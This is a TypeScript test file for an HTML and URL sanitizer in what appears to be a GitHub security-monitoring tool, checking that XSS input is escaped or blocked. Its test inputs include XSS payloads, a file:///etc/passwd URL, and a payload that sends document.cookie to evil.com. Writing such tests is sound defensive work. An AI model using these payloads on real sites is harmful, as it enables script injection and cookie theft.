import type { SecurityIssue } from '../types/index';
import { escapeHtml, sanitizeSecurityIssue, sanitizeUrl } from '../utils/html-sanitizer';

describe('HTML Sanitizer', () => {
  describe('escapeHtml', () => {
    it('should escape script tags', () => {
      expect(escapeHtml('<script>alert(1)</script>')).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it('should escape quotes', () => {
      expect(escapeHtml('"test"')).toBe('&quot;test&quot;');
      expect(escapeHtml("'test'")).toBe('&#039;test&#039;');
    });

    it('should escape HTML entities', () => {
      expect(escapeHtml('&<>"\'')).toBe('&amp;&lt;&gt;&quot;&#039;');
    });

    it('should escape event handlers', () => {
      expect(escapeHtml('<img src=x onerror=alert(1)>')).toBe('&lt;img src=x onerror=alert(1)&gt;');
    });

    it('should escape closing tags in strings', () => {
      expect(escapeHtml('</title><script>alert(1)</script>')).toBe(
        '&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;'
      );
    });

    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('');
    });

    it('should handle normal text', () => {
      expect(escapeHtml('Hello World')).toBe('Hello World');
    });

    it('should handle non-string inputs', () => {
      expect(escapeHtml(123 as unknown as string)).toBe('123');
      expect(escapeHtml(null as unknown as string)).toBe('null');
      expect(escapeHtml(undefined as unknown as string)).toBe('undefined');
    });

    it('should escape complex XSS payloads', () => {
      const payload = '<img src="x" onerror="fetch(\'http://evil.com?c=\'+document.cookie)">';
      const escaped = escapeHtml(payload);
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
    });

    it('should escape SVG-based XSS', () => {
      const payload = '<svg onload=alert(1)>';
      expect(escapeHtml(payload)).toBe('&lt;svg onload=alert(1)&gt;');
    });

    it('should escape iframe injection', () => {
      const payload = '<iframe src="javascript:alert(1)"></iframe>';
      expect(escapeHtml(payload)).toBe(
        '&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;'
      );
    });
  });

  describe('sanitizeUrl', () => {
    it('should block javascript: URIs', () => {
      expect(sanitizeUrl('javascript:alert(1)')).toBe('');
      expect(sanitizeUrl('JavaScript:alert(1)')).toBe('');
      expect(sanitizeUrl('JAVASCRIPT:alert(1)')).toBe('');
      expect(sanitizeUrl('  javascript:alert(1)  ')).toBe('');
    });

    it('should block data: URIs', () => {
      expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
      expect(sanitizeUrl('DATA:text/html,<script>alert(1)</script>')).toBe('');
    });

    it('should allow HTTPS URLs', () => {
      const url = 'https://github.com/test/repo';
      expect(sanitizeUrl(url)).toBe(url);
    });

    it('should allow HTTP URLs', () => {
      const url = 'http://github.com/test/repo';
      expect(sanitizeUrl(url)).toBe(url);
    });

    it('should allow valid URLs with special characters', () => {
      // Note: URLs in href attributes don't need HTML escaping
      // The browser handles them correctly. If displaying URL as text,
      // use escapeHtml() separately
      const url = 'https://github.com/test/<script>alert(1)</script>';
      const sanitized = sanitizeUrl(url);
      expect(sanitized).toBe(url);
    });

    it('should handle empty strings', () => {
      expect(sanitizeUrl('')).toBe('');
    });

    it('should handle null and undefined', () => {
      expect(sanitizeUrl(null as unknown as string)).toBe('');
      expect(sanitizeUrl(undefined as unknown as string)).toBe('');
    });

    it('should block URLs without protocol', () => {
      expect(sanitizeUrl('//evil.com/script.js')).toBe('');
      expect(sanitizeUrl('github.com')).toBe('');
    });

    it('should block file: URLs', () => {
      expect(sanitizeUrl('file:///etc/passwd')).toBe('');
    });

    it('should block vbscript: URLs', () => {
      expect(sanitizeUrl('vbscript:alert(1)')).toBe('');
    });

    it('should handle URLs with fragments', () => {
      const url = 'https://github.com/test#section';
      expect(sanitizeUrl(url)).toBe(url);
    });

    it('should handle URLs with query parameters', () => {
      const url = 'https://github.com/test?param=value&other=123';
      expect(sanitizeUrl(url)).toBe(url);
    });

    it('should handle unicode in URLs', () => {
      const url = 'https://github.com/test/测试';
      expect(sanitizeUrl(url)).toBe(url);
    });
  });

  describe('sanitizeSecurityIssue', () => {
    it('should sanitize all string fields in issue', () => {
      const issue: SecurityIssue = {
        type: 'self-merge',
        severity: 'high',
        repository: '<script>alert(1)</script>',
        description: 'Test<img src=x onerror=alert(1)>',
        details: {
          title: '<script>alert(2)</script>',
          url: 'https://github.com/test/<script>',
          repo_name: '<svg onload=alert(3)>',
          workflow_name: '</title><script>alert(4)</script>',
          author: '<script>alert(5)</script>',
          merged_by: '<img src=x onerror=alert(6)>',
          workflow_path: '.github/workflows/<script>.yml',
          workflow_url: 'https://github.com/actions/<script>',
        },
        detected_at: '2026-01-23T00:00:00Z',
      };

      const sanitized = sanitizeSecurityIssue(issue);

      expect(sanitized.repository).not.toContain('<script>');
      expect(sanitized.repository).toContain('&lt;script&gt;');

      expect(sanitized.description).not.toContain('<img');
      expect(sanitized.description).toContain('&lt;img');

      expect(sanitized.details.title).not.toContain('<script>');
      expect(sanitized.details.workflow_name).not.toContain('<script>');
      expect(sanitized.details.author).not.toContain('<script>');
      expect(sanitized.details.merged_by).not.toContain('<img');
    });

    it('should sanitize URLs properly', () => {
      const issue: SecurityIssue = {
        type: 'security-pr',
        severity: 'high',
        repository: 'test/repo',
        description: 'Security issue',
        details: {
          url: 'javascript:alert(1)',
          workflow_url: 'data:text/html,<script>alert(1)</script>',
        },
        detected_at: '2026-01-23T00:00:00Z',
      };

      const sanitized = sanitizeSecurityIssue(issue);

      expect(sanitized.details.url).toBe('');
      expect(sanitized.details.workflow_url).toBe('');
    });

    it('should handle undefined fields gracefully', () => {
      const issue: SecurityIssue = {
        type: 'disabled-actions',
        severity: 'medium',
        repository: 'test/repo',
        description: 'Actions disabled',
        details: {},
        detected_at: '2026-01-23T00:00:00Z',
      };

      const sanitized = sanitizeSecurityIssue(issue);

      expect(sanitized.details.title).toBeUndefined();
      expect(sanitized.details.url).toBeUndefined();
      expect(sanitized.details.repo_name).toBeUndefined();
    });

    it('should preserve valid data', () => {
      const issue: SecurityIssue = {
        type: 'self-merge',
        severity: 'high',
        repository: 'test/repo',
        description: 'User merged their own PR',
        details: {
          title: 'Fix authentication bug',
          url: 'https://github.com/test/repo/pull/123',
          author: 'user1',
          merged_by: 'user1',
        },
        detected_at: '2026-01-23T00:00:00Z',
      };

      const sanitized = sanitizeSecurityIssue(issue);

      expect(sanitized.repository).toBe('test/repo');
      expect(sanitized.description).toBe('User merged their own PR');
      expect(sanitized.details.title).toBe('Fix authentication bug');
      expect(sanitized.details.url).toBe('https://github.com/test/repo/pull/123');
      expect(sanitized.details.author).toBe('user1');
      expect(sanitized.details.merged_by).toBe('user1');
    });

    it('should not modify original issue object', () => {
      const issue: SecurityIssue = {
        type: 'self-merge',
        severity: 'high',
        repository: '<script>test</script>',
        description: 'Test',
        details: {
          title: '<script>alert(1)</script>',
        },
        detected_at: '2026-01-23T00:00:00Z',
      };

      const original = JSON.stringify(issue);
      sanitizeSecurityIssue(issue);
      const afterSanitize = JSON.stringify(issue);

      expect(original).toBe(afterSanitize);
    });
  });
});
